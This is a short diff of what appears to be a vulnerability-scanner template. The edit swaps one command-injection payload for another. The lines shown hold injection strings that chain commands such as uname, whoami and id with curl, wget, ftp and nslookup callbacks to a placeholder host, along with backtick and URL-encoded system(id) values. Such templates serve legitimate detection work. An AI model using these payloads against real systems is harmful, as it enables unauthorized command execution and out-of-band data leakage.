@@ -99,7 +99,7 @@ requests:
         - "uname -a > /dev/null; curl http://{{marker}}"
         - "whoami > /dev/null; wget http://{{marker}}"
         - "id > /dev/null; ftp -o /dev/null ftp://{{marker}}"
-        - "ls > /dev/null; nc -z {{marker}} 80"
+        - "%22.system%28id%29.%22"
         - "%26id%26"
         - ""\`id`""
         - "%26nslookup%20-q%3dcname%20%%60id%60{{marker}}.%26'%5c%22%600"
